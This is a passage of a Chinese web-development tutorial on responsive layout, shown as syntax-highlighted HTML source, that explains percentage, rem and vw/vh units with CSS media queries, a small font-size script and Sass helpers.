      height: calc(100vh - 3%);
      background-color: red;
    }
}
/* iphone5 */
@media screen and (max-width: 320px) {
    aside {
      float: none;
      width: 100%;
      height: 7%;
      background-color: green;
    }
    main {
      height: calc(100vh - 7%);
      background-color: red;
    }
}
复制代码
<span class="nt">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</span>

<span class="nt">&lt;p&gt;</span>但是我们必须要弄清楚css中子元素的百分比到底是相对谁的百分比。直接上结论吧：<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>子元素的<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>height<span class="nt">&lt;/code&gt;</span>或<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>width<span class="nt">&lt;/code&gt;</span>中使用百分比，是相对于子元素的直接父元素，<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>width<span class="nt">&lt;/code&gt;</span>相对于父元素的<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>width<span class="nt">&lt;/code&gt;</span>，<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>height<span class="nt">&lt;/code&gt;</span>相对于父元素的<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>height<span class="nt">&lt;/code&gt;</span>；子元素的<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>top<span class="nt">&lt;/code&gt;</span>和<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>bottom<span class="nt">&lt;/code&gt;</span>如果设置百分比，则相对于直接非<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>static<span class="nt">&lt;/code&gt;</span>定位(默认定位)的父元素的高度，同样子元素的<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>left<span class="nt">&lt;/code&gt;</span>和<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>right<span class="nt">&lt;/code&gt;</span>如果设置百分比，则相对于直接非<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>static<span class="nt">&lt;/code&gt;</span>定位(默认定位的)父元素的宽度；子元素的<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>padding<span class="nt">&lt;/code&gt;</span>如果设置百分比，不论是垂直方向或者是水平方向，都相对于直接父亲元素的<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>width<span class="nt">&lt;/code&gt;</span>，而与父元素的<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>height<span class="nt">&lt;/code&gt;</span>无关。跟<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>padding<span class="nt">&lt;/code&gt;</span>一样，<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>margin<span class="nt">&lt;/code&gt;</span>也是如此，子元素的<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>margin<span class="nt">&lt;/code&gt;</span>如果设置成百分比，不论是垂直方向还是水平方向，都相对于直接父元素的<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>width<span class="nt">&lt;/code&gt;</span>；<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>border-radius<span class="nt">&lt;/code&gt;</span>不一样，如果设置<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>border-radius<span class="nt">&lt;/code&gt;</span>为百分比，则是相对于自身的宽度，除了<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>border-radius<span class="nt">&lt;/code&gt;</span>外，还有比如<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>translate<span class="nt">&lt;/code&gt;</span>、<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>background-size<span class="nt">&lt;/code&gt;</span>等都是相对于自身的；<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>从上述对于百分比单位的介绍我们很容易看出如果全部使用百分比单位来实现响应式的布局，有明显的以下两个缺点：<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;ul&gt;</span>
  <span class="nt">&lt;li&gt;</span>计算困难，如果我们要定义一个元素的宽度和高度，按照设计稿，必须换算成百分比单位。<span class="nt">&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;</span>可以看出，各个属性中如果使用百分比，相对父元素的属性并不是唯一的。比如<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>width<span class="nt">&lt;/code&gt;</span>和<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>height<span class="nt">&lt;/code&gt;</span>相对于父元素的<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>width<span class="nt">&lt;/code&gt;</span>和<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>height<span class="nt">&lt;/code&gt;</span>，而<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>margin<span class="nt">&lt;/code&gt;</span>、<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>padding<span class="nt">&lt;/code&gt;</span>不管垂直还是水平方向都相对比父元素的宽度、<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>border-radius<span class="nt">&lt;/code&gt;</span>则是相对于元素自身等等，造成我们使用百分比单位容易使布局问题变得复杂。<span class="nt">&lt;/li&gt;</span>
<span class="nt">&lt;/ul&gt;</span>

<span class="nt">&lt;h3</span> <span class="na">id=</span><span class="s">"3rem布局"</span><span class="nt">&gt;</span>3.rem布局<span class="nt">&lt;/h3&gt;</span>

<span class="nt">&lt;p&gt;&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>REM<span class="nt">&lt;/code&gt;</span>是<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>CSS3<span class="nt">&lt;/code&gt;</span>新增的单位，并且移动端的支持度很高，Android2.x+,ios5+都支持。<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>rem<span class="nt">&lt;/code&gt;</span>单位都是相对于根元素html的<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>font-size<span class="nt">&lt;/code&gt;</span>来决定大小的,根元素的<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>font-size<span class="nt">&lt;/code&gt;</span>相当于提供了一个基准，当页面的size发生变化时，只需要改变<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>font-size<span class="nt">&lt;/code&gt;</span>的值，那么以<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>rem<span class="nt">&lt;/code&gt;</span>为固定单位的元素的大小也会发生响应的变化。 因此，如果通过<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>rem<span class="nt">&lt;/code&gt;</span>来实现响应式的布局，只需要根据视图容器的大小，动态的改变<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>font-size<span class="nt">&lt;/code&gt;</span>即可（而<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>em<span class="nt">&lt;/code&gt;</span>是相对于父元素的）。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;&lt;strong&gt;</span>rem响应式的布局思想：<span class="nt">&lt;/strong&gt;&lt;/p&gt;</span>

<span class="nt">&lt;ul&gt;</span>
  <span class="nt">&lt;li&gt;</span>一般不要给元素设置具体的宽度，但是对于一些小图标可以设定具体宽度值<span class="nt">&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;</span>高度值可以设置固定值，设计稿有多大，我们就严格有多大<span class="nt">&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;</span>所有设置的固定值都用<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>rem<span class="nt">&lt;/code&gt;</span>做单位（首先在HTML总设置一个基准值：<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>px<span class="nt">&lt;/code&gt;</span>和<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>rem<span class="nt">&lt;/code&gt;</span>的对应比例，然后在效果图上获取<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>px<span class="nt">&lt;/code&gt;</span>值，布局的时候转化为<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>rem<span class="nt">&lt;/code&gt;</span>值)<span class="nt">&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;</span>js获取真实屏幕的宽度，让其除以设计稿的宽度，算出比例，把之前的基准值按照比例进行重新的设定，这样项目就可以在移动端自适应了<span class="nt">&lt;/li&gt;</span>
<span class="nt">&lt;/ul&gt;</span>

<span class="nt">&lt;p&gt;&lt;strong&gt;</span>rem布局的缺点：<span class="nt">&lt;/strong&gt;&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>在响应式布局中，必须通过js来动态控制根元素<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>font-size<span class="nt">&lt;/code&gt;</span>的大小，也就是说css样式和js代码有一定的耦合性，且必须将改变<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>font-size<span class="nt">&lt;/code&gt;</span>的代码放在<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>css<span class="nt">&lt;/code&gt;</span>样式之前<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;pre</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;code&gt;</span>/*上述代码中将视图容器分为10份，font-size用十分之一的宽度来表示，最后在header标签中执行这段代码，就可以动态定义font-size的大小，从而1rem在不同的视觉容器中表示不同的大小，用rem固定单位可以实现不同容器内布局的自适应。*/
function refreshRem() {
    var docEl = doc.documentElement;
    var width = docEl.getBoundingClientRect().width;
    var rem = width / 10;
    docEl.style.fontSize = rem + 'px';
    flexible.rem = win.rem = rem;
}
win.addEventListener('resize', refreshRem);
复制代码
<span class="nt">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</span>

<span class="nt">&lt;p&gt;&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>REM<span class="nt">&lt;/code&gt;</span>布局也是目前多屏幕适配的最佳方式。默认情况下我们html标签的<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>font-size<span class="nt">&lt;/code&gt;</span>为16px,我们利用媒体查询，设置在不同设备下的字体大小。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;pre</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;code&gt;</span>/* pc width <span class="ni">&amp;gt;</span> 1100px */
html{ font-size: 100%;}
body {
    background-color: yellow;
    font-size: 1.5rem;
}
/* ipad pro */
@media screen and (max-width: 1024px) {
    body {
      background-color: #FF00FF;
      font-size: 1.4rem;
    }
}
/* ipad */
@media screen and (max-width: 768px) {
    body {
      background-color: green;
      font-size: 1.3rem;
    }
}
/* iphone6 7 8 plus */
@media screen and (max-width: 414px) {
    body {
      background-color: blue;
      font-size: 1.25rem;
    }
}
/* iphoneX */
@media screen and (max-width: 375px) and (-webkit-device-pixel-ratio: 3) {
    body {
      background-color: #0FF000;
      font-size: 1.125rem;
    }
}
/* iphone6 7 8 */
@media screen and (max-width: 375px) and (-webkit-device-pixel-ratio: 2) {
    body {
      background-color: #0FF000;
      font-size: 1rem;
    }
}
/* iphone5 */
@media screen and (max-width: 320px) {
    body {
      background-color: #0FF000;
      font-size: 0.75rem;
    }
}
复制代码
<span class="nt">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</span>

<span class="nt">&lt;h3</span> <span class="na">id=</span><span class="s">"4视口单位"</span><span class="nt">&gt;</span>4.视口单位<span class="nt">&lt;/h3&gt;</span>

<span class="nt">&lt;p&gt;&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>css3<span class="nt">&lt;/code&gt;</span>中引入了一个新的单位<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>vw/vh<span class="nt">&lt;/code&gt;</span>，与视图窗口有关，<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>vw<span class="nt">&lt;/code&gt;</span>表示相对于视图窗口的宽度，<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>vh<span class="nt">&lt;/code&gt;</span>表示相对于视图窗口高度，除了<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>vw<span class="nt">&lt;/code&gt;</span>和<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>vh<span class="nt">&lt;/code&gt;</span>外，还有<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>vmin<span class="nt">&lt;/code&gt;</span>和<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>vmax<span class="nt">&lt;/code&gt;</span>两个相关的单位。各个单位具体的含义如下：<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;table&gt;</span>
  <span class="nt">&lt;thead&gt;</span>
    <span class="nt">&lt;tr&gt;</span>
      <span class="nt">&lt;th&gt;</span>单位<span class="nt">&lt;/th&gt;</span>
      <span class="nt">&lt;th&gt;</span>含义<span class="nt">&lt;/th&gt;</span>
    <span class="nt">&lt;/tr&gt;</span>
  <span class="nt">&lt;/thead&gt;</span>
  <span class="nt">&lt;tbody&gt;</span>
    <span class="nt">&lt;tr&gt;</span>
      <span class="nt">&lt;td&gt;</span>vw<span class="nt">&lt;/td&gt;</span>
      <span class="nt">&lt;td&gt;</span>相对于视窗的宽度，1vw 等于视口宽度的1%，即视窗宽度是100vw<span class="nt">&lt;/td&gt;</span>
    <span class="nt">&lt;/tr&gt;</span>
    <span class="nt">&lt;tr&gt;</span>
      <span class="nt">&lt;td&gt;</span>vh<span class="nt">&lt;/td&gt;</span>
      <span class="nt">&lt;td&gt;</span>相对于视窗的高度，1vh 等于视口高度的1%，即视窗高度是100vh<span class="nt">&lt;/td&gt;</span>
    <span class="nt">&lt;/tr&gt;</span>
    <span class="nt">&lt;tr&gt;</span>
      <span class="nt">&lt;td&gt;</span>vmin<span class="nt">&lt;/td&gt;</span>
      <span class="nt">&lt;td&gt;</span>vw和vh中的较小值<span class="nt">&lt;/td&gt;</span>
    <span class="nt">&lt;/tr&gt;</span>
    <span class="nt">&lt;tr&gt;</span>
      <span class="nt">&lt;td&gt;</span>vmax<span class="nt">&lt;/td&gt;</span>
      <span class="nt">&lt;td&gt;</span>vw和vh中的较大值<span class="nt">&lt;/td&gt;</span>
    <span class="nt">&lt;/tr&gt;</span>
  <span class="nt">&lt;/tbody&gt;</span>
<span class="nt">&lt;/table&gt;</span>

<span class="nt">&lt;p&gt;&lt;img</span> <span class="na">src=</span><span class="s">"https://user-gold-cdn.xitu.io/2019/4/8/169fb9d770ad1553?imageView2/0/w/1280/h/960/format/webp/ignore-error/1"</span> <span class="na">alt=</span><span class="s">"img"</span> <span class="nt">/&gt;&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>用视口单位度量，视口宽度为100vw，高度为100vh（左侧为竖屏情况，右侧为横屏情况）。例如，在桌面端浏览器视口尺寸为650px，那么 1vw = 650 * 1% = 6.5px（这是理论推算的出，如果浏览器不支持0.5px，那么实际渲染结果可能是7px）。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>那么vw或者vh很类似百分比单位。vw和%的区别为：<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;table&gt;</span>
  <span class="nt">&lt;thead&gt;</span>
    <span class="nt">&lt;tr&gt;</span>
      <span class="nt">&lt;th&gt;</span>单位<span class="nt">&lt;/th&gt;</span>
      <span class="nt">&lt;th&gt;</span>含义<span class="nt">&lt;/th&gt;</span>
    <span class="nt">&lt;/tr&gt;</span>
  <span class="nt">&lt;/thead&gt;</span>
  <span class="nt">&lt;tbody&gt;</span>
    <span class="nt">&lt;tr&gt;</span>
      <span class="nt">&lt;td&gt;</span>%<span class="nt">&lt;/td&gt;</span>
      <span class="nt">&lt;td&gt;</span>大部分相对于祖先元素，也有相对于自身的情况比如（border-radius、translate等)<span class="nt">&lt;/td&gt;</span>
    <span class="nt">&lt;/tr&gt;</span>
    <span class="nt">&lt;tr&gt;</span>
      <span class="nt">&lt;td&gt;</span>vw/vh<span class="nt">&lt;/td&gt;</span>
      <span class="nt">&lt;td&gt;</span>相对于视窗的尺寸<span class="nt">&lt;/td&gt;</span>
    <span class="nt">&lt;/tr&gt;</span>
  <span class="nt">&lt;/tbody&gt;</span>
<span class="nt">&lt;/table&gt;</span>

<span class="nt">&lt;p&gt;</span>从对比中我们可以发现，<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>vw<span class="nt">&lt;/code&gt;</span>单位与百分比类似，单确有区别，前面我们介绍了百分比单位的换算困难，这里的<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>vw<span class="nt">&lt;/code&gt;</span>更像”理想的百分比单位”。任意层级元素，在使用<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>vw<span class="nt">&lt;/code&gt;</span>单位的情况下，1vw都等于视图宽度的百分之一。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>使用视口单位来实现响应式有两种做法：<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;h5</span> <span class="na">id=</span><span class="s">"1仅使用vw作为css单位"</span><span class="nt">&gt;</span>1.仅使用vw作为CSS单位<span class="nt">&lt;/h5&gt;</span>

<span class="nt">&lt;ul&gt;</span>
  <span class="nt">&lt;li&gt;</span>
    <span class="nt">&lt;p&gt;</span>对于设计稿的尺寸转换为为单位，我们使用<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>Sass<span class="nt">&lt;/code&gt;</span>函数编译<span class="nt">&lt;/p&gt;</span>

    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;pre</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;code&gt;</span>//iPhone 6尺寸作为设计稿基准
$vm_base: 375; 
@function vw($px) {
    @return ($px / 375) * 100vw;
}
复制代码
<span class="nt">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</span>    <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;</span>
    <span class="nt">&lt;p&gt;</span>无论是文本还是布局宽度、间距等都使用<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>vw<span class="nt">&lt;/code&gt;</span>作为单位<span class="nt">&lt;/p&gt;</span>

    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;pre</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;code&gt;</span>.mod_nav {
    background-color: #fff;
    <span class="ni">&amp;amp;</span>_list {
        display: flex;
        padding: vm(15) vm(10) vm(10); // 内间距
        <span class="ni">&amp;amp;</span>_item {
            flex: 1;
            text-align: center;
            font-size: vm(10); // 字体大小
            <span class="ni">&amp;amp;</span>_logo {
                display: block;
                margin: 0 auto;
                width: vm(40); // 宽度
                height: vm(40); // 高度
                img {
                    display: block;
                    margin: 0 auto;
                    max-width: 100%;
                }
            }
            <span class="ni">&amp;amp;</span>_name {
                margin-top: vm(2);
            }
        }
    }
}
复制代码
<span class="nt">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</span>    <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;</span>
    <span class="nt">&lt;p&gt;</span>1物理像素线（也就是普通屏幕下1px,高清屏幕下0.5px的情况）采用<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>transform<span class="nt">&lt;/code&gt;</span>属性<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>scale<span class="nt">&lt;/code&gt;</span>实现<span class="nt">&lt;/p&gt;</span>

    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;pre</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;code&gt;</span>.mod_grid {
    position: relative;
    <span class="ni">&amp;amp;</span>::after {
        // 实现1物理像素的下边框线
        content: '';
        position: absolute;
        z-index: 1;
        pointer-events: none;
        background-color: #ddd;
        height: 1px;
        left: 0;
        right: 0;
        top: 0;
        @media only screen and (-webkit-min-device-pixel-ratio: 2) {
            -webkit-transform: scaleY(0.5);
            -webkit-transform-origin: 50% 0%;
        }
    }
    ...
}
复制代码
<span class="nt">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</span>    <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;</span>
    <span class="nt">&lt;p&gt;</span>对于需要保持宽高比的图，应该用<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>padding-top<span class="nt">&lt;/code&gt;</span>实现<span class="nt">&lt;/p&gt;</span>

    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;pre</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;code&gt;</span>.mod_banner {
    position: relative;
    padding-top: percentage(100/700); // 使用padding-top
    height: 0;
    overflow: hidden;
    img {
        width: 100%;
        height: auto;
        position: absolute;
        left: 0;
        top: 0; 
    }
}
复制代码
<span class="nt">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</span>    <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;/li&gt;</span>
<span class="nt">&lt;/ul&gt;</span>

<span class="nt">&lt;h5</span> <span class="na">id=</span><span class="s">"2搭配vw和rem"</span><span class="nt">&gt;</span>2.搭配vw和rem<span class="nt">&lt;/h5&gt;</span>

<span class="nt">&lt;p&gt;</span>虽然采用<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>vw<span class="nt">&lt;/code&gt;</span>适配后的页面效果很好，但是它是利用视口单位实现的布局，依赖视口大小而自动缩放，无论视口过大还是过小，它也随着时候过大或者过小，失去了最大最小宽度的限制，此时我们可以结合<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>rem<span class="nt">&lt;/code&gt;</span>来实现布局<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;ul&gt;</span>
  <span class="nt">&lt;li&gt;</span>
    <span class="nt">&lt;p&gt;</span>给根元素大小设置随着视口变化而变化的<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>vw<span class="nt">&lt;/code&gt;</span>单位，这样就可以实现动态改变其大小<span class="nt">&lt;/p&gt;</span>
  <span class="nt">&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;</span>
    <span class="nt">&lt;p&gt;</span>限制根元素字体大小的最大最小值，配合<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>body<span class="nt">&lt;/code&gt;</span>加上最大宽度和最小宽度<span class="nt">&lt;/p&gt;</span>

    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;pre</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;code&gt;</span>// rem 单位换算：定为 75px 只是方便运算，750px-75px、640-64px、1080px-108px，如此类推
$vm_fontsize: 75; // iPhone 6尺寸的根元素大小基准值
@function rem($px) {
     @return ($px / $vm_fontsize ) * 1rem;
}
// 根元素大小使用 vw 单位
$vm_design: 750;
html {
    font-size: ($vm_fontsize / ($vm_design / 2)) * 100vw; 
    // 同时，通过Media Queries 限制根元素最大最小值
    @media screen and (max-width: 320px) {
        font-size: 64px;
    }
    @media screen and (min-width: 540px) {
        font-size: 108px;
    }
}
// body 也增加最大最小宽度限制，避免默认100%宽度的 block 元素跟随 body 而过大过小
body {
    max-width: 540px;
    min-width: 320px;
}
复制代码
<span class="nt">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</span>    <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;/li&gt;</span>
<span class="nt">&lt;/ul&gt;</span>

<span class="nt">&lt;h3</span> <span class="na">id=</span><span class="s">"5图片响应式"</span><span class="nt">&gt;</span>5.图片响应式<span class="nt">&lt;/h3&gt;</span>

<span class="nt">&lt;p&gt;</span>这里的图片响应式包括两个方面，一个就是大小自适应，这样能够保证图片在不同的屏幕分辨率下出现压缩、拉伸的情况；一个就是根据不同的屏幕分辨率和设备像素比来尽可能选择高分辨率的图片，也就是当在小屏幕上不需要高清图或大图，这样我们用小图代替，就可以减少网络带宽了。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;h5</span> <span class="na">id=</span><span class="s">"1使用max-width图片自适应"</span><span class="nt">&gt;</span>1.使用max-width（图片自适应）:<span class="nt">&lt;/h5&gt;</span>

<span class="nt">&lt;p&gt;</span>图片自适应意思就是图片能随着容器的大小进行缩放，可以采用如下代码：<span class="nt">&lt;/p&gt;</span>

